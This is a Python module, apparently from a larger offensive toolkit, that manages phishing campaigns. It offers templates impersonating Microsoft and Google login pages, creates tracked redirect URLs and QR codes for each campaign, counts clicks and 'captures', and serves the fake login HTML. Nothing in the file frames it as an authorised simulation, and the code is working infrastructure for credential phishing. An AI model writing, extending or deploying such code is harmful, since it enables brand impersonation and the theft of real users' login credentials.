import uuid
import time
from typing import Dict, Optional, List
from core.social.templates import PhishingTemplate, MicrosoftLoginTemplate, GoogleLoginTemplate, GenericUpdateTemplate
from core.qr_link_system import QRLinkSystem
from core.common.config import get

class SocialEngineeringManager:
    """
    Gestionnaire de campagnes d'ingénierie sociale.
    Orchestre la création de liens, le choix des templates et le suivi.
    """
    
    def __init__(self):
        self.templates: Dict[str, PhishingTemplate] = {
            "microsoft": MicrosoftLoginTemplate(),
            "google": GoogleLoginTemplate(),
            "generic": GenericUpdateTemplate()
        }
        self.campaigns: Dict[str, Dict] = {}
        self.qr_system = QRLinkSystem() # Utilise le système QR existant
        self.base_domain = get("BASE_DOMAIN") or "http://localhost:8000"

    def list_templates(self) -> List[Dict[str, str]]:
        return [{"id": k, "name": v.name, "description": v.description} for k, v in self.templates.items()]

    def create_campaign(self, name: str, template_id: str, target_email: str = None) -> Dict[str, str]:
        """
        Crée une nouvelle campagne de phishing.
        """
        if template_id not in self.templates:
            raise ValueError(f"Template inconnue: {template_id}")
            
        campaign_id = str(uuid.uuid4())
        template = self.templates[template_id]
        
        # URL de redirection (pointe vers notre Smart Redirector)
        # Format: /v5/r/{campaign_id}
        redirect_url = f"{self.base_domain}/v5/r/{campaign_id}"
        
        # Génération du QR Code associé
        qr_path = self.qr_system.generate_qr(redirect_url, f"campaign_{campaign_id}")
        
        campaign_data = {
            "id": campaign_id,
            "name": name,
            "template_id": template_id,
            "target_url": template.target_url,
            "created_at": time.time(),
            "status": "active",
            "redirect_url": redirect_url,
            "qr_code_path": qr_path,
            "metrics": {"clicks": 0, "captures": 0}
        }
        
        self.campaigns[campaign_id] = campaign_data
        return campaign_data

    def get_campaign(self, campaign_id: str) -> Optional[Dict]:
        return self.campaigns.get(campaign_id)

    def get_template_content(self, campaign_id: str) -> str:
        """
        Récupère le contenu HTML pour une campagne donnée.
        """
        campaign = self.campaigns.get(campaign_id)
        if not campaign:
            return "<h1>Campaign Not Found</h1>"
            
        template = self.templates.get(campaign["template_id"])
        if template:
            return template.render()
        return "<h1>Template Error</h1>"

# Instance globale
social_manager = SocialEngineeringManager()
